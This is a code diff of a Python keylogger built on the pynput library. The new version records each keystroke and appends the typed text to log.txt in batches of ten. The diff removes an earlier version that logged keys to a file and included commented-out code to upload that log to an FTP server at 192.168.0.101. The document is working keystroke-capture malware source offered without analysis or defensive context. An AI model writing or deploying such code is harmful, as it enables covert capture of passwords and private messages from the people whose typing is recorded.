@@ -1,35 +1,39 @@
+import pynput
+
 from pynput.keyboard import Key, Listener
-import ftplib
-import logging
 
-log_directory = ""
-
-logging.basicConfig(filename=(log_directory+"keylog-res.txt"),level=logging.DEBUG, format="%(asctime)s:%(message)s")
+count = 0
+keys = []
 
 
-# TODO: refactor the output of the file to be human readable
-def pressing_key(key):
-    try:
-        logging.info(str(key))
-    except AttributeError:
-        print("A special key {0} was pressed")
+def on_press(key):
+    global keys, count
+
+    keys.append(key)
+    count += 1
+    print("{0} pressed".format(key))
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
 
 
-# TODO: make this an arbitrary time frame instead of escape key
-def releasing_key(key):
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+
+            if k.find("space") > 0:
+                f.write('\n')
+
+            elif k.find("Key") == -1:
+                f.write(k)
+
+def on_release(key):
     if key == Key.esc:
         return False
 
 
-print("Started Listening!")
-
-with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
-# TODO: Create an actual FTP Server to test this shit.
-# Connects to a FTP Server, but none is provided. Leave this as commented.
-# session = ftplib.FTP("192.168.0.101")
-
-# with open("keylog-res.txt", "rb") as f:
-    # session.storbinary("STOR keylog-res.txt", f)
-    # session.quit()
